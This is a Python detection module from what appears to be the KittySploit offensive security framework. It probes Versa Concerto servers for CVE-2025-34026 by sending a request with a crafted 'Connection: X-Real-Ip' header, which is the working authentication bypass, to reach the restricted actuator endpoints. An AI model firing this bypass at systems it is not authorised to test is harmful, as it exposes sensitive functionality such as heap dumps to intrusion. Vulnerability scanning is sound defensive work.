#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""An authentication bypass vulnerability affected the Spring Boot Actuator endpoints in Versa Concerto due to im."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Versa Concerto Actuator Endpoint - Authentication Bypass Detection',
        'description': 'An authentication bypass vulnerability affected the Spring Boot Actuator endpoints in Versa Concerto due to improper handling of the X-Real-Ip header.Attackers could access restricted endpoints by omitting this header.The issue allowed unauthorized access to sensitive functionality, highlighting the need for proper header validation.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'versa', 'concerto', 'actuator', 'auth-bypass', 'springboot', 'cve', 'cve2025', 'vkev', 'vuln', 'kev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://projectdiscovery.io/blog/versa-concerto-authentication-bypass-rce/',
            'https://security-portal.versa-networks.com/emailbulletins/6830f94328defa375486ff2e',
            'https://www.cve.org/CVERecord?id=CVE-2025-34026',
        ],
        'cve': 'CVE-2025-34026',
    }

    def run(self):
        path = '/portalapi/actuator'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Connection': 'X-Real-Ip'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('heapdump',)
        header_any = ('EECP-CSRF-TOKEN',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='critical', reason='Versa Concerto Actuator Endpoint - Authentication Bypass detected', path=path)
            return True
        return False

